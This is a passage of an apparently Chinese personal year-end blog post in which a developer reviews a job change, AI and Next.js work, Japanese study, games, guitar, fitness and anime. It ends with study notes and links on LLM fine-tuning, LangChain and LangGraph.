<li>项目迭代业务 四个APP 大部分都是和大模型相关的服务业务 或者就是TTS语音 Minimax gemini gpt4o-mini</li>
<li>Gitlab AI Code Review 搭建</li>
<li>Apple 苹果订阅计划优惠码配置</li>
<li>服务器的成本优化 降低线上服务器的内存 磁盘 CPU各种机器配置 关闭一些不用的机器</li>
<li>《短链的原理与实现》文档 部门分享</li>
<li>职级晋升答辩 1月24号 周五 通过 职级升到高级开发 工资却没有提升</li>
<li>跟着xxxx项目 Q3加班一个季度 10106, 每天10点上班晚上10点下班 大小周周六加班, 天天忙着版本迭代, 回头看也不知道自己在忙什么，除了稳定的版本迭代 按时提供接口和文档 按时上线，纯工具人，自己也没有做出其他的什么贡献。</li>
<li>.................. (可能还有其他 但是我记性不好 也都忘记了)</li>
<li>9月底 30号离职了 lastday 最后一天 上午就是开会 交接 中午请组内另外两个人喝了一杯咖啡，等到6点半下班, 拜拜了陪伴了3年的伙计。</li>
</ul>
<h3 data-id="heading-2">回顾Q4 第二家公司 干了什么事情</h3>
<ul>
<li>组内氛围真的很好 很幸运 前面半个月就是熟悉业务 快速融入的一个状态</li>
<li>参加meet-up milvus a2a rag dify 相关的分享 <a href="https://link.juejin.cn?target=https%3A%2F%2Fcrazywoola.github.io%2Fdify-x-milvus%2F" target="_blank" title="https://crazywoola.github.io/dify-x-milvus/" ref="nofollow noopener noreferrer">crazywoola.github.io/dify-x-milv…</a> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmilvus-io%2Fmilvus" target="_blank" title="https://github.com/milvus-io/milvus" ref="nofollow noopener noreferrer">github.com/milvus-io/m…</a></li>
<li>11月和12月 全力推进全栈开发 Nextjs AI数字人平台 支撑几个业务上线 各种mcp/rag 构建ReAct服务推理逻辑 ...........(省略一万字 根本写不完)</li>
<li>Nextjs 内部分享 react next.js typescript ant design x ahook</li>
</ul>
<blockquote>
<p>月度总结:</p>
<ul>
<li>你做的东西能不能给别人复用</li>
<li>个人复盘应强调未来愿景而非项目细节；建议长远规划（如AI能力复用）</li>
<li>分享AI coding技巧</li>
<li>为什么选择node 后续的规划 自己去想 自己owner整个项目</li>
<li>部门愿景 研发效率 未来不是场景规划的维度</li>
<li>xx铺设完了 它里面的副作用相关的能不能做成工具 在平台上面</li>
</ul>
</blockquote>
<h2 data-id="heading-3">生活</h2>
<ul>
<li>第一家 工作不累，但是业务需求没价值 公司氛围很差, 每天熬夜到凌晨3 4点 看圆圆的教程 天天熬夜 住的环境实在是太差了 隔音性太差 楼上的傻逼一直发出异响 距离退租还有2个月 租房还要押金是真的恶心 退房了押金还不还也是恶心 e类人才补贴限制了 自如的租赁凭证确实给的快 没什么好喷的 下次的房子估计还是找自如了 但是合租真的好难受。每天睡不着 失眠的状态 隔音效果是真的差 太吵了 不仅是外面的车/风声音 楼上凳子的声音 走来走去 后面3月份换到另外一个房子 还是很吵 这小区有问题 天天搞装修 电梯也是一直换 太吵了。</li>
<li>第二家 也是拥有上工牌了, 工作上强度还行吧 加班也能接受 每天一杯咖啡续命 每天回去之后都是玩到凌晨2/3点才睡觉, 刚来需要熟悉的时间, 组内的同事基本都抽烟 自己也抽 很快就和同事打成一片了，我的leader也是很好,给的压力也是很大,天天找你抽烟聊未来的规划,做什么 怎么做 需要你做什么 从产品需求的模糊状态讨论到 现在的业务alpha版本上线 到接入各种业务过程 给的指导真的很多, 同事给我讲讲前端规范，组内团建多次 公司黑客松/年会/每周各种分享也比较有趣。</li>
<li>未来职业规划有点想往ai应用开发方向靠了 找一条垂直的业务赛道深耕。</li>
</ul>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6bbf920458d4ca792af014a2f6e536b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5L2Yb3Zv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767857909&amp;x-signature=2jN5hJ1L7jhDOFoqveab29ZtmHg%3D" alt="IMG_6594.JPG" width="40%" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2e18e180fff24a0cb1ca50b803c99820~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5L2Yb3Zv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767857909&amp;x-signature=exsJb10az67f15474Y0ocXFYgc0%3D" alt="image.png" width="24%" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a897e3643b8a4c70a3ffc358cb6272b5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5L2Yb3Zv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767857909&amp;x-signature=WqwpGSMlqbSpiB9%2FrjLuAaf7Fg4%3D" alt="image.png" width="24%" loading="lazy"/>
<h4 data-id="heading-4">日语</h4>
<ul>
<li>从年初的50音开始- 语法- 新标日初级上-新标日初级下册-蓝宝书 -绿宝书-单词 moji -听力 -冲刺真题-圆圆的n2冲刺课(他们12月份就开学了 我落后了2个月多的进度 买了两本新的书籍 try和词汇考前对策 今天周日到了 开始补进度吧)- 新标日中级上下册- 长难句子-精听。07/06 周日去浙大校区考N2了 半年学习 直接考试N2 还是上班的状态 最后结果也是没有通过 但是过程真的很享受 2026年还会继续考 冲冲冲。</li>
</ul>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dfa1bb3b73f4415aaf3c81e696bf7a5a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5L2Yb3Zv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767857909&amp;x-signature=z8yaqSlo3hIOXEyGHOntZcsiGbk%3D" alt="" width="32%" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8198c67e6b6f4d65a525037a0374aca7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5L2Yb3Zv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767857909&amp;x-signature=SsqzeKtoNl2AmK7ZTxuJAxvVfNQ%3D" alt="" width="32%" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c10319698c9d4cebb601efbe3c55529d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5L2Yb3Zv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767857909&amp;x-signature=uXSPtqbcOUJpezWjWfTRrZptmgc%3D" alt="" width="32%" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/87fdb8aa25b141f6b952cae27608d032~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5L2Yb3Zv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767857909&amp;x-signature=ugWZnzvKD3Aon0tmp26roxYvlTk%3D" alt="image.png" width="35%" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3c7f7102f5fb4e57b685387afd603e42~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5L2Yb3Zv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767857909&amp;x-signature=I5U2cBgWUjV5ca4OphADa%2BIV1Mw%3D" alt="IMG_1788.PNG" width="30%" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/94c44258aff34777b0f8c880c8907996~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5L2Yb3Zv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767857909&amp;x-signature=PaY7VAkCTQ4SwsBKlFp%2B3%2FlUc3c%3D" alt="IMG_1786.PNG" width="30%" loading="lazy"/>
<h4 data-id="heading-5">游戏 玩了很多手游 什么都玩的不好</h4>
<ul>
<li>明日方舟 每天一醒就是打开明日方舟 领资源 做任务 无语了 每天都肝 买了一个198礼包 自选M3 医疗 超大杯</li>
<li>火影忍者 每天都登录消耗体力 中间因为考试和找工作 断玩了一段时间</li>
<li>王者荣耀 从高中玩到现在 都快10年了</li>
<li>雀魂麻将 每天打打友人/比赛场 雀魂麻将记录 一直拿小号去刷连胜之道 太难了 10次连续前2 四麻 先把四麻的搞定 再弄3麻的吧 后面就没有拿大号打段位了 周末平常就去天街旁边 打了日麻 来苏州也去线下打了一次</li>
<li>最近玩了几天LOLM 手游 还不错</li>
</ul>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c27ca20c2db2414aa8ac8a8d1b204222~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5L2Yb3Zv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767857909&amp;x-signature=XYqOkEEAB7TGX38S1AmQzxrI408%3D" alt="" width="30%" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7a452cbdd62245a29b4c9b814e2d6865~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5L2Yb3Zv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767857909&amp;x-signature=nRL5KrD11IeCE6EJzwe27Qg%2Bw6o%3D" alt="" width="30%" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/04127eb38a2142e4b43638fec49d0649~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5L2Yb3Zv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767857909&amp;x-signature=rApt%2BNum0Fvr8SY0OL4iqcFMhfw%3D" alt="" width="30%" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/55ec1e00756f4a66b2e21608f9338aeb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5L2Yb3Zv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767857909&amp;x-signature=nmXHGOgp1tCMr%2FBndsKfecdwx64%3D" alt="" width="30%" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/956de1e46da24921bc845718c9c2462f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5L2Yb3Zv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767857909&amp;x-signature=z%2BIBwBBUEXR8KSv07cF3DQ03cT0%3D" alt="image.png" width="38%" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c594eab39a24467385d7d8af8cd63811~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5L2Yb3Zv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767857909&amp;x-signature=iaKFYgf13%2BCEWZW3xFyY5dUY404%3D" alt="" width="17%" loading="lazy"/>
<h4 data-id="heading-6">做饭</h4>
<ul>
<li>2月开始 锅 69/电饭煲 158 其实这样算下来并没有多省钱 而是需要时间的堆积 一些硬性物质的要求下 长时间使用它的价值 还好吧 中间几个月做了自己想吃的菜 江西炒粉也试了试 还行 能吃 现在锅和电饭煲都不知道扔到哪里去了 根本没有时间去弄 每天就是点外卖 点外卖。</li>
</ul>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cb3f0cd16f2d4a9d9f9796cbb8f4db7c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5L2Yb3Zv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767857909&amp;x-signature=gqLCBq6L2lXwgdiU5p0dewG%2BW6M%3D" alt="" width="30%" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b802d3cd07548449992ee4f22389681~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5L2Yb3Zv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767857909&amp;x-signature=pteXaNw1iQdPdSbwGDexTt0Ce6A%3D" alt="" width="30%" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1650251132914d53b18da3224bee04f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5L2Yb3Zv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767857909&amp;x-signature=BLQklepeBeFkIfVClrCb9dinkvk%3D" alt="" width="30%" loading="lazy"/>
<h4 data-id="heading-7">电吉他</h4>
<ul>
<li>Q1和Q2最近一直在看电吉他 看了孤独摇滚之后的后遗症 tagima/芬达的一些比较二次元的配色 单单双 确实比较好看 自己也不是很懂 现在这个木吉他都是放着吃灰 买来是不是一样的场景 还是吃灰 就图一个新鲜感呢？报了一个线下班 每周日下午上课 从3月10号-6月22号 周六去线下体验了下电吉他课程 30分钟 很快 就基础+和弦+音调 节拍 后面就买了tagima 635 pro复古白+雅马哈thr10音箱 3600块+ 一个1700的线下课程 5000多就没了 旋律 节奏 和声 六线谱 简谱 音阶 击钩弦 音程 扫弦 和弦 5个把位的音阶位置 枪花 奥特曼 滑弦(三种有头有尾 有头无尾 无头无尾) +音阶 击勾弦 +音阶 la指型的击勾弦练习 推弦 Dont say lazy 和弦+扫弦+护弦 《枪花》 《奥特曼》《dont say lazy》《Starir to heaven》等等, 99块 买了一些ACG相关的资料 安装guitar pro 8 软件 导入p8文件 这软件确实不错 能自动播放 和选定片段循环播放。从7月份到现在 已经没有碰过 真的很忙 2026年学习新的歌曲。</li>
</ul>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8573ea7f4d094b2da7750f66bc4c40f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5L2Yb3Zv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767857909&amp;x-signature=bMUoYiE80lLbRsYin5MiNbPD3Cw%3D" alt="" width="30%" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2fc122b197174e97b240bdd116c2a8d5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5L2Yb3Zv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767857909&amp;x-signature=HER8aZa3WMVGpEg9xnEkchVVKuc%3D" alt="" width="54%" loading="lazy"/>
<h4 data-id="heading-8">健身</h4>
<ul>
<li>卧推+推肩+杠铃深蹲+倒蹬+坐姿划船+杠铃弯举+龙门屈臂下压 小红书上找的教程 跟着一起练 也没有坚持多久 断断续续的 还是要注意身体健康，自己身体也该去体检一下了 估计全是有问题的指标了 天天抽烟 喝酒 熬夜 没有一项健康的生活方式。</li>
</ul>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48517ad456e04c0aabe3123b804e1900~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5L2Yb3Zv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767857909&amp;x-signature=N13CAm20SGG11L0jfVSJ2LNLBC8%3D" alt="" width="30%" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c6da906475ef401294f11df31b925df6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5L2Yb3Zv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767857909&amp;x-signature=RSFmfTAJ%2FIBZ5SupCJtw7cDn0EI%3D" alt="" width="30%" loading="lazy"/>
<h4 data-id="heading-9">通勤 9号电动车</h4>
<ul>
<li>虽然没买上机车 买了个9号电动车通勤挺方便的 3900左右，配上我以前买的Shoel头盔+insta 360 都用上了 然后再买了一个A🌟的手套 好看唉 不错不错，主要是第一周第二周上下班通勤坐地铁 太累了 住的地方离地铁一段距离 公司离地铁一段距离 背着一个包 肩膀都酸了 受不了 直接买个电动车吧。机车的话 上牌是个问题 又危险 全是红绿灯 公司虽然有地方停 算了 以后再考虑买吧。电动车都不知道出了多少次事故了，突然想起来 我要去支付宝买个保险 拖了好久了。</li>
</ul>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/18dcedffd8e341d29351b8f8d4ead545~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5L2Yb3Zv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767857909&amp;x-signature=IxmPAY4OtPnmEDeB9KXNRSN%2F840%3D" alt="" width="30%" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/97589bf575cd4d63a16255d6b0df185d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5L2Yb3Zv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767857909&amp;x-signature=0vkZHVmHV3NJcbepInIajC%2FATh8%3D" alt="" width="30%" loading="lazy"/>
<h4 data-id="heading-10">动漫 所谓活着 就是不断重复着艰辛与快乐</h4>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fbangumi%2Fplay%2Fss46089%3Ft%3D572%26spm_id_from%3D333.1007.top_right_bar_window_history.content.click" target="_blank" title="https://www.bilibili.com/bangumi/play/ss46089?t=572&amp;spm_id_from=333.1007.top_right_bar_window_history.content.click" ref="nofollow noopener noreferrer">葬送的芙莉莲</a> <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fbangumi%2Fplay%2Fss425%3Fspm_id_from%3D333.337.0.0%26from_spmid%3D666.25.series.0" target="_blank" title="https://www.bilibili.com/bangumi/play/ss425?spm_id_from=333.337.0.0&amp;from_spmid=666.25.series.0" ref="nofollow noopener noreferrer">某科学的超电磁炮</a> <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fbangumi%2Fplay%2Fss1172%3Fspm_id_from%3D333.337.0.0" target="_blank" title="https://www.bilibili.com/bangumi/play/ss1172?spm_id_from=333.337.0.0" ref="nofollow noopener noreferrer">轻音少女 第一季</a> <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fbangumi%2Fplay%2Fep718237%3Fspm_id_from%3D333.337.0.0%26from_spmid%3D666.25.episode.0" target="_blank" title="https://www.bilibili.com/bangumi/play/ep718237?spm_id_from=333.337.0.0&amp;from_spmid=666.25.episode.0" ref="nofollow noopener noreferrer">孤独摇滚！</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fbangumi%2Fplay%2Fss1586%3Fspm_id_from%3D333.337.0.0%26from_spmid%3D666.25.series.0" target="_blank" title="https://www.bilibili.com/bangumi/play/ss1586?spm_id_from=333.337.0.0&amp;from_spmid=666.25.series.0" ref="nofollow noopener noreferrer">Fate/stay night [Unlimited Blade Works] 第一季</a> <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fbangumi%2Fplay%2Fss25739%3Ffrom_spmid%3D666.25.series.0" target="_blank" title="https://www.bilibili.com/bangumi/play/ss25739?from_spmid=666.25.series.0" ref="nofollow noopener noreferrer">关于我转生变成史莱姆这档事</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fbangumi%2Fplay%2Fss1177%3Ffrom_spmid%3D666.25.series.0" target="_blank" title="https://www.bilibili.com/bangumi/play/ss1177?from_spmid=666.25.series.0" ref="nofollow noopener noreferrer">CLANNAD</a> 86不存在的战区 进击的巨人 天才麻将少女-阿知贺篇 柯南 独眼的残想</li>
<li>夏日重现 吹响吧低音号 薰香花朵凛然绽放 龙与虎</li>
<li>我的青春恋爱物语果然有问题 Jojo 斗破苍穹 死亡笔记 小林家的龙丫头</li>
<li>Eva relife 鬼灭 剧场版</li>
<li>凡人修仙传 遮天</li>
</ul>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c514975cf519404a9f2536b0fa3dcf20~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5L2Yb3Zv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767857909&amp;x-signature=VgpHWka412mtlZ7vq0GPxHCFY2M%3D" alt="" width="48%" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a372c88667cf4aa1ab8b8705cc83b3a7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5L2Yb3Zv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767857909&amp;x-signature=tCJ6n85Ll%2BXlZAHgacMMAEknFzU%3D" alt="" width="48%" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ae621e01ef66437ea0d2ad04fd1a9de9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5L2Yb3Zv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767857909&amp;x-signature=02HDDSruPR3FIaBG1KPr7lnGfL8%3D" alt="" width="48%" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4427d393487647818adb9a8c2c15b6e1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5L2Yb3Zv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767857909&amp;x-signature=9psLvM3VXvcBXE044tsh1IZvFd4%3D" alt="" width="48%" loading="lazy"/>
<h2 data-id="heading-11">技术</h2>
<blockquote>
<p>个人技术学习 都是随意输出的 其实还有很多很多</p>
</blockquote>
<ul>
<li>Q3的时候 在看weclone 开源项目(朋友是作者 推荐的) 主要是聊天记录复刻数字分身, 对小模型进行微调 本地部署，使用Qwen2.5-7B-Instruct模型，LoRA方法对sft阶段微调(增强模型在特定⾏业领域的知识)，一个可视化 LLama-Factory (国产最热⻔的微调框架), 去AutoDL 租个机器自己也能尝试下，需要补的理论知识有点多。</li>
<li>也在看一些SpringAi langchain4j 搭建的开源项目agent，也找了几个LangChain和LangGraph的开源项目看了看，看到的更多是RAG+单Agent设计，比较好的设计是multi-agent架构，agent都独立开发应用+工具集，前置链路做一个意图分类进行路由，加任务规划agent拆解任务 + 串行并行分析。</li>
<li>线性回归 损失函数 神经网络 CNN RNN 概率语言模型 微调与冻结 强化学习 神经网络语言模型 transformer BERT GPT <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1z5411f7Bm%3Fbuvid%3DYE48DFEBED10C41B40368EBDA88532FC034F%26is_story_h5%3Dfalse%26mid%3Dtw5zRpAeZkmY4WOuKCAQUg%253D%253D%26plat_id%3D116%26share_from%3Dugc%26share_medium%3Diphone%26share_plat%3Dios%26share_session_id%3DE448B979-486D-4C2A-9B62-D3DC010251CC%26share_source%3DQQ%26share_tag%3Ds_i%26spmid%3Dunited.player-video-detail.0.0%26timestamp%3D1738676840%26unique_k%3DYNr5e7i%26up_id%3D1921388479%26vd_source%3D5c4d3e12d3512ed84532d27dcef8ab0d" target="_blank" title="https://www.bilibili.com/video/BV1z5411f7Bm?buvid=YE48DFEBED10C41B40368EBDA88532FC034F&amp;is_story_h5=false&amp;mid=tw5zRpAeZkmY4WOuKCAQUg%3D%3D&amp;plat_id=116&amp;share_from=ugc&amp;share_medium=iphone&amp;share_plat=ios&amp;share_session_id=E448B979-486D-4C2A-9B62-D3DC010251CC&amp;share_source=QQ&amp;share_tag=s_i&amp;spmid=united.player-video-detail.0.0&amp;timestamp=1738676840&amp;unique_k=YNr5e7i&amp;up_id=1921388479&amp;vd_source=5c4d3e12d3512ed84532d27dcef8ab0d" ref="nofollow noopener noreferrer">【循环神经网络】5分钟搞懂RNN，3D动画深入浅出_哔哩哔哩_bilibili</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.cnblogs.com%2Fnickchen121%2Fp%2F16470569.html" target="_blank" title="https://www.cnblogs.com/nickchen121/p/16470569.html" ref="nofollow noopener noreferrer">www.cnblogs.com/nickchen121…</a> 预训练语言模型的前世今生</li>
<li>Agent的概念 提示词工程 Function call，思维链</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2025%2Fpdf%2F22886943%2F1760076725412-6e84337c-39c8-456f-93f6-51ea9e6fe461.pdf" target="_blank" title="https://www.yuque.com/attachments/yuque/0/2025/pdf/22886943/1760076725412-6e84337c-39c8-456f-93f6-51ea9e6fe461.pdf" ref="nofollow noopener noreferrer">Function Calling 与 MCP 协议｜深究 MCP 协议的设计 .pdf</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fhuangyf2013320506%2Fbilibili_repository" target="_blank" title="https://github.com/huangyf2013320506/bilibili_repository" ref="nofollow noopener noreferrer">github.com/huangyf2013…</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Foigi8odzc5w.feishu.cn%2Fwiki%2FLWqEwXNkBibT0ykrbI0cvptBnAf" target="_blank" title="https://oigi8odzc5w.feishu.cn/wiki/LWqEwXNkBibT0ykrbI0cvptBnAf" ref="nofollow noopener noreferrer">Function Calling 与 MCP 协议｜深究 MCP 协议的设计</a></li>
<li>LangChain（PromptTemplate/FewShot、LCEL 编排与流式输出、MessageHistory/Redis 历史管理、多模态图片输入、@tool 自定义工具、RAG 索引检索生成）搭建并部署可观测的 LLM 服务（LangServe/CLI/Swagger/RemoteRunnable、Smith 链路监控与 verbose 日志），支持 invoke/batch/stream 与 asyncio 并发调用，并可在 Streamlit 端用 StreamlitCallbackHandler 聚合流式结果为一句话展示。</li>
<li>LangGraph 构建多智能体图编排系统：设计 x 类功能节点与 Start/End、条件边、回边，通过 LLM 分类路由写入 state，并结合 checkpointer + store 实现短时与长时上下文；接入高德 MCP 工具链与 Redis 向量库（对联 CSV → embedding_model:text-embedding-v1）完成 RAG/生成，同时支持 <code>interrupt()</code> 人类审批与 time-travel 回放调试。</li>
<li>大模型微调流程</li>
</ul>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/275fd55d135c4a16b8e96dd4d6b17629~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5L2Yb3Zv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767857909&amp;x-signature=9Wm3135Nm%2FTfQSoHxMvqzPIxxhc%3D" alt="" width="30%" loading="lazy"/>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fhiyouga%2FLLaMA-Factory" target="_blank" title="https://github.com/hiyouga/LLaMA-Factory" ref="nofollow noopener noreferrer">github.com/hiyouga/LLa…</a> 一站式大模型训练/微调工厂，支持 SFT、RLHF、DPO、LoRA/QLoRA，全流程可视化 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxming521%2FWeClone" target="_blank" title="https://github.com/xming521/WeClone" ref="nofollow noopener noreferrer">github.com/xming521/We…</a> <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.astral.sh%2Fuv%2Fgetting-started%2Finstallation%2F%23standalone-installer" target="_blank" title="https://docs.astral.sh/uv/getting-started/installation/#standalone-installer" ref="nofollow noopener noreferrer">docs.astral.sh/uv/getting-…</a> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmicrosoft%2FLoRA" target="_blank" title="https://github.com/microsoft/LoRA" ref="nofollow noopener noreferrer">github.com/microsoft/L…</a> <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Funslothai%2Funsloth" target="_blank" title="https://github.com/unslothai/unsloth" ref="nofollow noopener noreferrer">github.com/unslothai/u…</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fml-explore%2Fmlx" target="_blank" title="https://github.com/ml-explore/mlx" ref="nofollow noopener noreferrer">github.com/ml-explore/…</a> Apple 官方推出的机器学习库，专门为 Apple Silicon (M1/M2/M3) 优化，用于 LLM 推理与训练 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fhiyouga%2FLLaMA-Factory" target="_blank" title="https://github.com/hiyouga/LLaMA-Factory" ref="nofollow noopener noreferrer">github.com/hiyouga/LLa…</a> 高效 LoRA/QLoRA 微调库，比 Hugging Face PEFT 更快、更省显存。<a 